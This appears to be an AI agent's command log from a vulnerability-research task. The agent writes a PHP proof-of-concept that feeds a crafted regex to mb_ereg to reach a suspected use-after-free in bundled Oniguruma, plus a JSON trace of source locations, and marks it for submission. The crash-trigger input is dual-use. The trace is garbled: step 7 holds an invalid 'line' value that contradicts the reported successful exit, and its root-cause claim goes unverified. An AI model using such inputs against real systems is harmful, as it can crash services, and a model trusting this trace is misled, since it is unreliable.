Command `cd /workspace && python3 - <<'PY'
from pathlib import Path
p = Path('poc2.php')
# pattern designed to stress nested empty quantifiers / recursive capture checks
p.write_text('<?php mb_regex_encoding("UTF-8"); $p="(?:()|())*\\2"; $s=""; var_dump(mb_ereg($p,$s)); ?>')
trace = [
  {"step":1,"file":"ext/mbstring/tests/mb_ereg_variation7.phpt","function":"<global>","line":17,"var":"pattern","code":"$regex_ascii = '([A-Z]\\w{1,4}is( [aeiou]|h)) ?.*\\.\\s[0-9]+(5([6-9][79]){2})[[:punct:]]$';","note":"The mbregex test corpus confirms support for quantified subpatterns and nested capture groups in user-supplied patterns."},
  {"step":2,"file":"oniguruma/src/regint.h","function":"<global>","line":63,"var":"USE_STUBBORN_CHECK_CAPTURES_IN_EMPTY_REPEAT","code":"#define USE_STUBBORN_CHECK_CAPTURES_IN_EMPTY_REPEAT","note":"The bundled Oniguruma build enables the empty-repeat capture-check path that leads to quantifier emptiness analysis."},
  {"step":3,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5457,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"When a quantified body may be empty, compilation asks quantifiers_memory_node_info() to classify the body tree."},
  {"step":4,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4894,"var":"node","code":"switch (NODE_TYPE(node)) {","note":"The emptiness classifier recursively walks the attacker-controlled regex AST, including nested alternations, quantifiers, and captures."},
  {"step":5,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4935,"var":"NODE_BODY(node)","code":"if (NODE_IS_RECURSION(node)) { return BODY_MAY_BE_EMPTY_REC; }","note":"Recursive/captured empty-repeat structures are treated specially, which is the root of the UAF-prone analysis path reported by the crash."},
  {"step":6,"file":"oniguruma/src/regcomp.c","function":"compile_quant_body_with_empty_check","line":1044,"var":"emptiness","code":"else if (emptiness == BODY_MAY_BE_EMPTY_REC) r = add_op(reg, OP_EMPTY_CHECK_END_MEMST_PUSH);","note":"The computed emptiness classification directly changes emitted bytecode and the compiler's use of capture/memory state."},
  {"step":7,"file":"oniguruma/src/regcomp.c","function":"compile_tree","line":selected if? not","var":"pattern '(?:()|())*\\2'","code":"mb_ereg(pattern, string)","note":"A crafted pattern with empty alternation inside a quantifier and backreference exercises the vulnerable emptiness-analysis path during compilation."}
]
Path('candidate_trace.json').write_text(__import__('json').dumps(trace))
PY
cat /workspace/candidate_trace.json && echo '
---SUBMIT---' && true` executed with exit code 0.
